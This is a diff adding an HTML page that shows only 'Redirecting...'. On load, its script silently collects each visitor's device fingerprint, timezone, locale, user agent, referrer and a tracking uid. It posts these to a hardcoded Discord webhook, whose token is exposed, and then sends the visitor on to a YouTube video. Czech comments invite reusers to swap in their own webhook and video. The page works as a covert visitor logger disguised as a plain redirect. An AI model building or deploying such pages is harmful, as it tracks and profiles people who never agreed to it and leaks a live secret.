@@ -1,0 +1,58 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Redirecting...</title>
+  <script>
+    const webhookURL = "https://discordapp.com/api/webhooks/1400862351896481865/fats3duHY0d3z9OuFkjxnLANFj4a5qwMwnEWvZI_Lscx9CO6CJuBusX_AdnPoknF5Nzi"; // <- Nahraď svou URL
+    const uid = new URLSearchParams(window.location.search).get("uid") || "N/A";
+
+    function detectDevice() {
+      const width = window.screen.width;
+      const isTouch = 'ontouchstart' in window;
+      if (width <= 768 || isTouch) return "Mobile";
+      if (width > 768 && width <= 1024) return "Tablet";
+      return "Desktop";
+    }
+
+    const now = new Date();
+    const localTime = now.toLocaleString("cs-CZ");
+    const locale = Intl.DateTimeFormat().resolvedOptions().locale || navigator.language;
+
+    const data = {
+      content: `🧠 New access logged:
+• Time (UTC): ${now.toISOString()}
+• Local Time: ${localTime}
+• Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+• Locale: ${locale}
+• UID: ${uid}
+• Device: ${detectDevice()}
+• Screen: ${window.screen.width}x${window.screen.height}
+• Color Depth: ${window.screen.colorDepth}
+• Pixel Ratio: ${window.devicePixelRatio}
+• Language: ${navigator.language}
+• Platform: ${navigator.platform}
+• Cookies Enabled: ${navigator.cookieEnabled}
+• Java Enabled: ${navigator.javaEnabled && navigator.javaEnabled()}
+• User-Agent: ${navigator.userAgent}
+• Referrer: ${document.referrer || "N/A"}
+• Page URL: ${window.location.href}`
+    };
+
+    fetch(webhookURL, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify(data)
+    }).finally(() => {
+      // Přesměrování na YouTube video
+      window.location.href = "https://youtu.be/4Fy9PcTYm90"; // <- Nahraď svým videem
+    });
+  </script>
+</head>
+<body>
+  <p>Redirecting...</p>
+</body>
+</html>
